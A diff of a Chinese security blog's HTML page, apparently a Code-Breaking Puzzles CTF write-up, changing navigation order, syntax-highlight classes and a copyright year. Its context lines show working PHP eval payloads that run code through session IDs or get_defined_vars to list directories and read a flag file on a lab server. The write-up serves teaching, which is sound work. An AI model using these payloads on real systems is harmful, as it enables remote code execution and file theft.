@@ -97,14 +97,14 @@
 
                         
                         <li>
-                            <a href="/tags/">Tags</a>
+                            <a href="/about/">About</a>
                         </li>
                         
                     
 
                         
                         <li>
-                            <a href="/about/">About</a>
+                            <a href="/tags/">Tags</a>
                         </li>
                         
                     
@@ -311,7 +311,7 @@
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /?<span class="attribute">code</span>=eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line"><span class="attribute">PHPSESSID</span>=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</span><br></pre></td></tr></table></figure>
 <h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars"></a>get_defined_vars</h2><p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/9.png" alt></p>
 <p>用于返回定义的全部变量，这样就相当于可以获取任意位置传入变量值。就可以通过<code>next</code>、<code>current</code>来操纵这个数组，就可以获取到想要的变量值。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//51.158.75.42:8084/</span></span><br><span class="line">?code=<span class="built_in">eval</span>(next(current(get_defined_vars())));</span><br><span class="line">&amp;b=print_r(scandir(<span class="string">'../'</span>));print_r(file_get_contents(<span class="string">'../flag_phpbyp4ss'</span>));</span><br></pre></td></tr></table></figure>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//51.158.75.42:8084/</span></span><br><span class="line">?<span class="keyword">code</span>=eval(next(current(get_defined_vars())));</span><br><span class="line">&amp;b=print_r(scandir(<span class="string">'../'</span>));print_r(file_get_contents(<span class="string">'../flag_phpbyp4ss'</span>));</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>在Apache中还可以利用<code>getallheaders</code>去获取http头，但是这里的webserver是Nginx，所以没有这个函数</p>
 <p>另外在php 7.1下，<code>getenv()</code>函数新增了无参数时会获取服务段的env数据，这个时候也可以利用</p>
@@ -559,7 +559,7 @@
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; Kingkk&#39;s Blog 2020 
+                    Copyright &copy; Kingkk&#39;s Blog 2021 
                     浙ICP备17041487号
                     <br>
                     Theme by <a href="http://huangxuan.me">Hux</a> 
